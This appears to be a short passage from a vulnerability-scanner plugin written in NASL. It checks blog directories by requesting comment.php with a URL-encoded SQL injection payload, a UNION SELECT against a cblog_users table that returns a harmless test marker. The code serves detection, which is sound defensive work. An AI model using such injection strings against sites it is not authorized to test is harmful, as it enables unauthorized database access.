...
for dir in nasl_make_list_unique( "/blog", "/cbblog", "/blindblog", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/comment.php?id=-1%27%20UNION%20ALL%20SELECT%20NULL,0x53514c2d496e6a656374696f6e2d54657374,3,4%20FROM%20cblog_users%23" );
